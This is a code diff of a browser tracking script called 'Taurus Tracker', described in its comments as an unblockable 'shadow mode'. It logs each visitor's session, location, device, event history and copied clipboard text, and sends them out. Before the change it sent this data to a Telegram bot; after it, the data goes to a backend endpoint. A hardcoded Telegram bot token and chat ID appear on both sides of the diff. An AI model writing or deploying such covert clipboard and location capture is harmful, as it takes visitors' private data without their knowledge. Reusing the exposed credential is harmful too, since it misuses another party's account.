@@ -1,6 +1,6 @@
 // TAURUS TRACKER v5.0 (Shadow Mode / Backend Oriented)
 /**
- * TAURUS TRACKER v5.4 (Final System - Telegram Fixed)
+ * TAURUS TRACKER v5.5 (Final System - Unified Reporting V27)
  * ----------------------------------
  * - Altyapı: Backend Oriented (Engellenemez Gölge Modu)
  * - Güvenlik: Middleware IP Gating & Server-side Reporting
@@ -10,7 +10,7 @@
 
 /* Taurus Tracker v5 - Mobile Optimized */
 (function () {
-    console.log("🐂 Taurus Tracker v5.0 (Shadow Mode) Initializing...");
+    console.log("🐂 Taurus Tracker v5.5 (Shadow Mode) Initializing...");
     window.taurus_set_internal = () => { window.isInternalNav = true; console.log("🐂 Manual Internal Signal Set"); };
 
     // CONFIGURATION (Sensitive tokens moved to backend)
@@ -45,33 +45,27 @@
 
         const duration = Math.round((new Date() - sessionStartTime) / 1000);
 
-        // Load credentials from cache or defaults
-        const botToken = (window.cachedTelegramConfig && window.cachedTelegramConfig.botToken) || '8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE';
-        const chatId = (window.cachedTelegramConfig && window.cachedTelegramConfig.chatId) || '6886010817';
-        const url = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
-
         // Build detailed log content
         const eventLog = localHistory.slice(-50).join('\n'); // Last 50 events for context
         const clipboardEntries = localHistory.filter(e => e.includes('Copy:')).join('\n');
 
-        const exitMsg = `🛑 <b>SESSION REPORT [${sessionID || 'unknown'}]</b>\n` +
-            `--------------------------------\n` +
-            `⏱ <b>DURATION:</b> ${duration} seconds\n` +
-            `📍 <b>EXIT PAGE:</b> ${window.location.pathname}\n` +
-            `🌍 <b>GEO:</b> ${sessionData?.city || 'Unknown'}, ${sessionData?.country || ''}\n` +
-            `💻 <b>DEVICE:</b> ${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os || 'Unknown'})\n\n` +
-            `📋 <b>CLIPBOARD:</b>\n${clipboardEntries || 'None'}\n\n` +
-            `📝 <b>EVENT LOG (Last 50):</b>\n${eventLog || 'No events recorded'}`;
+        const payload = {
+            sessionID: sessionID || 'unknown',
+            duration: duration,
+            exitPage: window.location.pathname,
+            location: `${sessionData?.city || 'Unknown'}, ${sessionData?.country || ''}`,
+            deviceInfo: `${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os || 'Unknown'})`,
+            clipboard: clipboardEntries || 'None',
+            eventLog: eventLog || 'No events recorded',
+            botToken: window.cachedTelegramConfig?.botToken || '8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE',
+            chatId: window.cachedTelegramConfig?.chatId || '6886010817'
+        };
 
-        fetch(url, {
+        fetch(CONFIG.api.report, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             keepalive: true,
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: exitMsg,
-                parse_mode: 'HTML'
-            })
+            body: JSON.stringify(payload)
         }).catch(function () { });
     }
 
@@ -1179,13 +1173,8 @@
 
                 // EXIT REPORT: Only if not internal navigation
                 if (!window.isInternalNav) {
-                    const duration = Math.round((new Date() - sessionStartTime) / 1000);
-                    // Firestore Report
-                    sendPulse("Session Exit", 'high', { duration: duration });
-                    // Telegram Report (sendExitMessage is also called by beforeunload/pagehide)
-                    // but calling it here handles the 'tab switch' or 'minimize' case if desired.
-                    // However, user specifically asked for 'true exit' (X button).
-                    // So we rely on the top-level listeners for Telegram.
+                    // Removed redundant sendPulse exit report here as sendExitMessage 
+                    // handles this more reliably on true exit via pagehide/beforeunload.
                 }
             } else {
                 logHistory('Tab', 'Visible');
